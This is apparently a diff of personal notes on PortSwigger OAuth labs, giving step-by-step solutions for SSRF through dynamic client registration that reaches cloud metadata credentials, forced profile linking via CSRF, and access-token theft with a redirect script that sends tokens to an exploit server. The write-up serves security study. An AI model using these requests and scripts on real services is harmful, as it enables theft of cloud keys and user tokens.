@@ -37,12 +37,46 @@
 7. **Validate all user input** related to OAuth flows
 
 
-
 ## 1. SSRF via OpenID dynamic client registration
+This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.
 
+To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment. You can log in to your own account using the following credentials: `wiener:peter`
 
+**Analysis**:
+1. While proxying traffic through Burp, log in to your own account. Browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` to access the configuration file. Notice that the client registration endpoint is located at `/reg`.
+2. In Burp Repeater, create a suitable `POST` request to register your own client application with the OAuth service. You must at least provide a `redirect_uris` array containing an arbitrary whitelist of callback URIs for your fake application. For example:
+    `POST /reg HTTP/1.1 Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net Content-Type: application/json { "redirect_uris" : [ "https://example.com" ] }`
+3. Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new `client_id`.
+4. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send the `GET /client/CLIENT-ID/logo` request to Burp Repeater.
+5. In Repeater, go back to the `POST /reg` request that you created earlier. Add the `logo_uri` property. Right-click and select "Insert Collaborator payload" to paste a Collaborator URL as its value . The final request should look something like this:
+    `POST /reg HTTP/1.1 Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net Content-Type: application/json { "redirect_uris" : [ "https://example.com" ], "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN" }`
+6. Send the request to register a new client application and copy the `client_id` from the response. In Repeater, go to the `GET /client/CLIENT-ID/logo` request. Replace the `CLIENT-ID` in the path with the new one you just copied and send the request.
+7. Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the `logo_uri` property to elicit requests from the OAuth server.
+8. Go back to the `POST /reg` request in Repeater and replace the current `logo_uri` value with the target URL:
+    `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`
+9. Send this request and copy the new `client_id` from the response. Go back to the `GET /client/CLIENT-ID/logo` request and replace the `client_id` with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
 
-
+**Workflow**:
+1.  While proxying traffic through Burp, log in to your own account. Browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` to access the configuration file. Notice that the client registration endpoint is located at `/reg`.
+	![](Pasted%20image%2020250310021557.png)
+	![](Pasted%20image%2020250310023045.png)
+		![](Pasted%20image%2020250310023212.png)
+2. Create a suitable `POST` request to register your own client application with the OAuth service. You must at least provide a `redirect_uris` array containing an arbitrary whitelist of callback URIs for your fake application. The response contains various metadata associated with your new client application, including a new `client_id
+	![](Pasted%20image%2020250310023745.png)
+3. The "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send the `GET /client/CLIENT-ID/logo` request to Burp Repeater.
+	![](Pasted%20image%2020250310024651.png)
+	
+4. Go back to the `POST /reg` request that you created earlier. Add the `logo_uri` property. Right-click and select "Insert Collaborator payload" to paste a Collaborator URL as its value
+	![](Pasted%20image%2020250310024807.png)
+5. Send the request to register a new client application and copy the `client_id` from the response. In Repeater, go to the `GET /client/CLIENT-ID/logo` request. Replace the `CLIENT-ID` in the path with the new one you just copied and send the request.
+	![](Pasted%20image%2020250310025048.png)
+6. In the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the `logo_uri` property to elicit requests from the OAuth server.
+	![](Pasted%20image%2020250310025225.png)
+7. `POST /reg` request in Repeater and replace the current `logo_uri` value with the target URL to exfiltrate desired sensitive data:
+    `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`
+	![](Pasted%20image%2020250310025405.png)
+8. Send this request and copy the new `client_id` from the response. Go back to the `GET /client/CLIENT-ID/logo` request and replace the `client_id` with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
+	![](Pasted%20image%2020250310025720.png)
 
 
 ## 2. Forced OAuth profile linking
@@ -66,12 +100,12 @@ You can log in to your own accounts using the following credentials:
 7. Deliver the exploit to the victim. When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete `carlos` to solve the lab.
 
 **Workflow**:
-- no `state` param is implemented, that means that no protection against CSRF is in place
+1. no `state` param is implemented, that means that no protection against CSRF is in place
 	![](Pasted%20image%2020241215221943.png)
 
-- after linking a social media profile to our account, log out and connect trough social media again but this time intercept the request with proxy until the client code is received (drop the request afterwards in order to have a valid code - don t use it)
+2. after linking a social media profile to our account, log out and connect trough social media again but this time intercept the request with proxy until the client code is received (drop the request afterwards in order to have a valid code - don t use it)
 	![](Pasted%20image%2020241215222155.png)
-- deliver the payload using the above URL containing our intercepted code--> when the victim(admin in our case) will open this iframe URL, our social media profile will be linked instead to his session (when will choose to log in with social media profile again we will observe that we forced a profile linking to an admin account)
+3. deliver the payload using the above URL containing our intercepted code--> when the victim(admin in our case) will open this iframe URL, our social media profile will be linked instead to his session (when will choose to log in with social media profile again we will observe that we forced a profile linking to an admin account)
 	![](Pasted%20image%2020241215222841.png)
 
 
@@ -118,47 +152,40 @@ You cannot access the admin's API key by simply logging in to their account on t
     `<script> window.location = '/?'+document.location.hash.substr(1) </script>`
 11. To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for `GET /?access_token=[...]`.
 12. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:
-    `<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>`
+    ```javascript
+    <script>
+     if (!document.location.hash)
+      { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' }
+	 else { window.location = '/?'+document.location.hash.substr(1) 
+	 </script>
+    ```
 13. To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for `GET /?access_token=[...]`. Deliver the exploit to the victim, then copy their access token from the log.
 14. In Repeater, go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
 
-
 **Workflow**:
-- initial API get request
+1. initial API get request
   ![](Pasted%20image%2020241216122752.png)
-  - initial oauth flow
+  2. initial oauth flow
 	![](Pasted%20image%2020241216122828.png)
-- testing for redirect (adding /../)
+3. testing for redirect (adding /../)
 	![](Pasted%20image%2020241216122850.png)
-
-- finding a valid redirect page (next post feature of the blog posts)
+4. finding a valid redirect page (next post feature of the blog posts)
 	![](Pasted%20image%2020241216122941.png)
-
-- chaining all exploits together (redirect_uri --> our exploit server)
+5. chaining all exploits together (redirect_uri --> our exploit server)
 	![](Pasted%20image%2020241216121556.png)
-
-- testing the redirect to the exploit server
+6. testing the redirect to the exploit server
 	![](Pasted%20image%2020241216121351.png)
-
-- adding payload script for token extraction
+7. adding payload script for token extraction
 	![](Pasted%20image%2020241216121332.png)
-
-- testing the method
+8. testing the method
 	![](Pasted%20image%2020241216121506.png)
-
-- building the final exploit (more details to add)
+9. building the final exploit (more details to add)
 	![](Pasted%20image%2020241216121933.png)
-
-- testing the final exploit form
+10. testing the final exploit form // delivering exploit to the victim and capture his token
 	![](Pasted%20image%2020241216122038.png)
-
-- delivering exploit to the victim and capture his token
-	![](Pasted%20image%2020241216122226.png)
-
-- back to the API request --> inject the extracted token 
+11. back to the API request --> inject the extracted token 
 	![](Pasted%20image%2020241216122633.png)
-	
-**Script**:
+
 If the hash is not present:
 - The browser is redirected (`window.location`) to an OAuth authentication endpoint. This URL includes various parameters that are critical for the OAuth flow:
     - `client_id=YOUR-LAB-CLIENT-ID`: Identifies the client requesting authentication.
@@ -171,7 +198,7 @@ If the hash is present:
     - For example, if the hash is `#access_token=abc123`, this will result in `access_token=abc123`.
 - The resulting redirection might look like `/?access_token=abc123`.
 
-**Purpose**
+**Script summary**
 - **Without a hash**: Redirects the user to an OAuth authentication server to obtain an access token.
 - **With a hash**: Appends the hash data to the new URL as a query parameter likely to process the token 
 
